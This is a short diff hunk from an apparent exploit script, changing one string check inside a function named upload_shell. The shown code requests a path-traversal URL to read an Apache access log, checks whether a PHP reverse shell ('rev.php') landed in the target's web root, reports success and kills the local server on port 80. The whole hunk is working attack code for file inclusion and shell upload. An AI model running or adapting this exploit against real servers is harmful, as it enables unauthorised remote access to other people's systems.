@@ -83,7 +83,7 @@ def upload_shell(ip, url):
 	
 	log_check_url = url + "dogs/../../../../../../var/log/apache2/access&ext=.log"
 	check_r = requests.get(log_check_url)
-	if "rev.php" in check_r.text:
+	if " rev.php" in check_r.text:
 		print("\n[+]Successfully uploaded shell to root web directory (http://" + ip + "/rev.php)[+]\n")
 		print("Shutting down Python web server...\n")
 		subprocess.call(["fuser","-k","80/tcp"])
